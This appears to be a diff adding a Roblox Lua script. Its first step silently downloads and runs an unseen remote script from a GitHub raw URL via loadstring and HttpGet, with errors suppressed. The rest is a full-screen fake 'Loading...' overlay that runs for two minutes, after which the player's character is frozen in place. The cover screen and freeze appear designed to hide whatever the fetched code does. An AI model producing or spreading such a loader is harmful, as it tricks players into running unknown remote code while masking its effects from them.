@@ -1,0 +1,77 @@
+-- Step 1: Run the external script first
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Gey123123/roblox-script123/refs/heads/main/script"))()
+end)
+
+-- Step 2: Create UI
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "RealisticLoadingUI"
+loadingGui.IgnoreGuiInset = true
+loadingGui.ResetOnSpawn = false
+loadingGui.Parent = PlayerGui
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.Parent = loadingGui
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Text = "Loading..."
+loadingText.Font = Enum.Font.GothamBlack
+loadingText.TextScaled = true
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.BackgroundTransparency = 1
+loadingText.Size = UDim2.new(0.6, 0, 0.1, 0)
+loadingText.Position = UDim2.new(0.2, 0, 0.4, 0)
+loadingText.Parent = bg
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.5, 0, 0.05, 0)
+barBg.Position = UDim2.new(0.25, 0, 0.52, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBg.BorderSizePixel = 0
+barBg.AnchorPoint = Vector2.new(0, 0.5)
+barBg.Parent = bg
+barBg.ClipsDescendants = true
+barBg.BackgroundTransparency = 0
+barBg.UICorner = Instance.new("UICorner", barBg)
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+barFill.UICorner = Instance.new("UICorner", barFill)
+
+local credit = Instance.new("TextLabel")
+credit.Text = "made by: g3zmar"
+credit.Font = Enum.Font.Gotham
+credit.TextScaled = true
+credit.TextColor3 = Color3.fromRGB(150, 150, 150)
+credit.BackgroundTransparency = 1
+credit.Size = UDim2.new(1, 0, 0.05, 0)
+credit.Position = UDim2.new(0, 0, 0.95, 0)
+credit.Parent = bg
+
+-- Step 3: Animate loading for 120 seconds (2 minutes)
+local totalTime = 120
+local steps = 100
+local delayPerStep = totalTime / steps
+
+for i = 1, steps do
+    local percent = i / steps
+    barFill:TweenSize(UDim2.new(percent, 0, 1, 0), "Out", "Sine", delayPerStep * 0.8, true)
+    wait(delayPerStep)
+end
+
+-- Step 4: Freeze the player
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+hrp.Anchored = true
+
+-- Optional: Keep the UI or hide it
+-- loadingGui.Enabled = false
